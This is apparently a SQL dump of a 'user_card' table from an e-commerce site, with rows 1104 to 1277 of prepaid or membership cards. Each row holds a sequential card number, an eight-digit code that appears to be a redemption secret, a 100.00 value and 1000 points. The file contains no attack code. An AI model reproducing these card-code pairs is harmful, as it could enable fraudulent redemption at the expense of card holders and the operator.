INSERT INTO `ec22703249_user_card` VALUES ('1277', '0', '1', '', '00277', '46850160', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1276', '0', '1', '', '00276', '40840611', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1275', '0', '1', '', '00275', '47767345', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1274', '0', '1', '', '00274', '85597829', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1273', '0', '1', '', '00273', '30501329', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1272', '0', '1', '', '00272', '60311701', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1271', '0', '1', '', '00271', '98090258', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1270', '0', '1', '', '00270', '18008311', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1269', '0', '1', '', '00269', '49268798', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1268', '0', '1', '', '00268', '92657599', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1267', '0', '1', '', '00267', '79367704', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1266', '0', '1', '', '00266', '36146482', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1265', '0', '1', '', '00265', '11021475', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1264', '0', '1', '', '00264', '56641418', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1263', '0', '1', '', '00263', '26965074', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1262', '0', '1', '', '00262', '54611503', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1261', '0', '1', '', '00261', '85308232', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1260', '0', '1', '', '00260', '76854074', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1259', '0', '1', '', '00259', '12026072', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1258', '0', '1', '', '00258', '69294854', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1257', '0', '1', '', '00257', '61159648', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1256', '0', '1', '', '00256', '92785165', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1255', '0', '1', '', '00255', '96937782', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1254', '0', '1', '', '00254', '72778944', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1253', '0', '1', '', '00253', '13195171', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1252', '0', '1', '', '00252', '43949427', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1251', '0', '1', '', '00251', '17543021', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1250', '0', '1', '', '00250', '25324469', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1249', '0', '1', '', '00249', '30026427', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1248', '0', '1', '', '00248', '98152035', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1247', '0', '1', '', '00247', '54847750', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1246', '0', '1', '', '00246', '11470459', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1245', '0', '1', '', '00245', '42480719', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1244', '0', '1', '', '00244', '67180358', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1243', '0', '1', '', '00243', '92589255', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1242', '0', '1', '', '00242', '77405690', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1241', '0', '1', '', '00241', '97766522', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1240', '0', '1', '', '00240', '95463266', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1239', '0', '1', '', '00239', '40275109', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1238', '0', '1', '', '00238', '12938225', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1237', '0', '1', '', '00237', '39859668', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1236', '0', '1', '', '00236', '11965255', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1235', '0', '1', '', '00235', '75756079', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1234', '0', '1', '', '00234', '16979485', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1233', '0', '1', '', '00233', '30073698', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1232', '0', '1', '', '00232', '32501031', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1231', '0', '1', '', '00231', '58056420', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1230', '0', '1', '', '00230', '84459759', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1229', '0', '1', '', '00229', '94798564', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1228', '0', '1', '', '00228', '61589090', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1227', '0', '1', '', '00227', '61524215', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1226', '0', '1', '', '00226', '13611598', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1225', '0', '1', '', '00225', '89545876', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1224', '0', '1', '', '00224', '18894543', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1223', '0', '1', '', '00223', '64907367', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1222', '0', '1', '', '00222', '47220040', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1221', '0', '1', '', '00221', '20128334', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1220', '0', '1', '', '00220', '65133226', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1219', '0', '1', '', '00219', '43495905', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1218', '0', '1', '', '00218', '49811489', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1217', '0', '1', '', '00217', '83593937', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1216', '0', '1', '', '00216', '39319318', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1215', '0', '1', '', '00215', '48374171', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1214', '0', '1', '', '00214', '81721508', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1213', '0', '1', '', '00213', '68531630', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1212', '0', '1', '', '00212', '53975326', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1211', '0', '1', '', '00211', '31331667', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1210', '0', '1', '', '00210', '97233246', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1209', '0', '1', '', '00209', '21762048', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1208', '0', '1', '', '00208', '63596770', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1207', '0', '1', '', '00207', '67902801', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1206', '0', '1', '', '00206', '79415664', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1205', '0', '1', '', '00205', '87775522', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1204', '0', '1', '', '00204', '94883377', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1203', '0', '1', '', '00203', '66401650', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1202', '0', '1', '', '00202', '46971699', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1201', '0', '1', '', '00201', '30395027', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1200', '0', '1', '', '00200', '53709583', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1199', '0', '1', '', '00199', '93690806', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1198', '0', '1', '', '00198', '79918218', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1197', '0', '1', '', '00197', '48960652', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1196', '0', '1', '', '00196', '60746525', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1195', '0', '1', '', '00195', '69849306', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1194', '0', '1', '', '00194', '49743690', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1193', '0', '1', '', '00193', '18561594', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1192', '0', '1', '', '00192', '39676733', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1191', '0', '1', '', '00191', '34811031', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1190', '0', '1', '', '00190', '73827116', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1189', '0', '1', '', '00189', '83970717', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1188', '0', '1', '', '00188', '24985705', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1187', '0', '1', '', '00187', '82998165', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1186', '0', '1', '', '00186', '80364851', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1185', '0', '1', '', '00185', '79744847', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1184', '0', '1', '', '00184', '47084955', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1183', '0', '1', '', '00183', '58644140', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1182', '0', '1', '', '00182', '15993687', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1181', '0', '1', '', '00181', '36365442', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1180', '0', '1', '', '00180', '92383229', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1179', '0', '1', '', '00179', '40996961', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1178', '0', '1', '', '00178', '31443102', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1177', '0', '1', '', '00177', '20057363', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1176', '0', '1', '', '00176', '27653975', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1175', '0', '1', '', '00175', '83487481', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1174', '0', '1', '', '00174', '92434574', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1173', '0', '1', '', '00173', '89748665', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1172', '0', '1', '', '00172', '96423419', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1171', '0', '1', '', '00171', '19821791', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1170', '0', '1', '', '00170', '54150100', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1169', '0', '1', '', '00169', '14024933', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1168', '0', '1', '', '00168', '57197903', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1167', '0', '1', '', '00167', '13323989', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1166', '0', '1', '', '00166', '44837595', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1165', '0', '1', '', '00165', '43634244', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1164', '0', '1', '', '00164', '47802654', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1163', '0', '1', '', '00163', '17333788', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1162', '0', '1', '', '00162', '86644591', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1161', '0', '1', '', '00161', '82939672', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1160', '0', '1', '', '00160', '50140368', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1159', '0', '1', '', '00159', '69277737', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1158', '0', '1', '', '00158', '24275370', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1157', '0', '1', '', '00157', '81229377', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1156', '0', '1', '', '00156', '68570593', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1155', '0', '1', '', '00155', '86864640', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1154', '0', '1', '', '00154', '74983129', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1153', '0', '1', '', '00153', '19104438', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1152', '0', '1', '', '00152', '42263207', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1151', '0', '1', '', '00151', '65317919', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1150', '0', '1', '', '00150', '94680285', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1149', '0', '1', '', '00149', '10240241', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1148', '0', '1', '', '00148', '74276518', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1147', '0', '1', '', '00147', '12481421', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1146', '0', '1', '', '00146', '43716547', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1145', '0', '1', '', '00145', '88810672', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1144', '0', '1', '', '00144', '13267599', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1143', '0', '1', '', '00143', '22388482', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1142', '0', '1', '', '00142', '70776460', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1141', '0', '1', '', '00141', '64543378', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1140', '0', '1', '', '00140', '37212910', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1139', '0', '1', '', '00139', '83117822', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1138', '0', '1', '', '00138', '40842284', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1137', '0', '1', '', '00137', '93359742', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1136', '0', '1', '', '00136', '36172771', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1135', '0', '1', '', '00135', '14758696', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1134', '0', '1', '', '00134', '44011706', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1133', '0', '1', '', '00133', '23959765', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1132', '0', '1', '', '00132', '53269406', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1131', '0', '1', '', '00131', '70838817', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1130', '0', '1', '', '00130', '36232359', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1129', '0', '1', '', '00129', '49533772', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1128', '0', '1', '', '00128', '85796483', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1127', '0', '1', '', '00127', '45347167', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1126', '0', '1', '', '00126', '50716025', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1125', '0', '1', '', '00125', '63136123', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1124', '0', '1', '', '00124', '50016140', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1123', '0', '1', '', '00123', '46852951', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1122', '0', '1', '', '00122', '60443962', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1121', '0', '1', '', '00121', '26891825', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1120', '0', '1', '', '00120', '69673125', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1119', '0', '1', '', '00119', '28415249', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1118', '0', '1', '', '00118', '11619130', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1117', '0', '1', '', '00117', '58901147', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1116', '0', '1', '', '00116', '16111841', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1115', '0', '1', '', '00115', '86521397', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1114', '0', '1', '', '00114', '32291471', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1113', '0', '1', '', '00113', '24172734', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1112', '0', '1', '', '00112', '88552762', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1111', '0', '1', '', '00111', '65963940', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1110', '0', '1', '', '00110', '42262536', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1109', '0', '1', '', '00109', '74134149', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1108', '0', '1', '', '00108', '41702662', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1107', '0', '1', '', '00107', '20725169', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1106', '0', '1', '', '00106', '48103771', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1105', '0', '1', '', '00105', '13396705', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1104', '0', '1', '', '00104', '30878036', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
